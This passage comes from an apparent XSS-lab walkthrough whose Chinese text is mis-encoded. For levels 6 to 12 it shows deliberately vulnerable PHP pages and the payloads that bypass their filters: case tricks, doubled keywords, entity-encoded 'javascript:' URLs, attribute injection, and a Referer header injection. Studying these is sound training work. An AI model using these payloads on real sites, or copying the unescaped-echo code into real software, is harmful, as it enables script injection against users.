align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level6.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a Href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">Href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>//JavaScriptå¯¹å¤§å°å†™æ•æ„Ÿ</span></span><br></pre></td></tr></table></figure>

<h1 id="level7"><a href="#level7" class="headerlink" title="level7:"></a>level7:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level7<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level7<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str =strtolower( $_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level7.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hhrefref=&quot;</span><span class="attr">javaSscriptcript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;//</span></span><br><span class="line"><span class="string">//HTMLå®ä½“è½¬æ¢------&gt; https://www.qqxiuzi.cn/bianma/zifushiti.php</span></span><br></pre></td></tr></table></figure>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8:"></a>level8:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level8<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level8<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta"> echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level8.jpg</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javasc&amp;#x72;<span class="attr">ipt</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="level9"><a href="#level9" class="headerlink" title="level9:"></a>level9:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level9<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level9<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if(false===strpos($str7,&#x27;http://&#x27;))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">else</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level9.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javasc&amp;#x72;<span class="attr">ipt</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">// http://</span></span><br></pre></td></tr></table></figure>
<h1 id="level10"><a href="#level10" class="headerlink" title="level10:"></a>level10:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level10<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level10<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str11 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level10.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span> value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span> onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h1 id="level11"><a href="#level11" class="headerlink" title="level11:"></a>level11:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level11<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level11<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level11.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>ä½¿ç”¨burp suiteæŠ“åŒ…ï¼Œåœ¨é¡µé¢æ·»åŠ ï¼š<blockquote>
<p>Referer: â€œ onmouseover&#x3D;alert(1) type&#x3D;â€textâ€</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c2cfad38001547bba61d8f7c04d81588~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
</blockquote>
</li>
</ul>
<h1 id="level12"><a href="#level12" class="headerlink" title="level12:"></a>level12:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level12<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level12<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level12.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 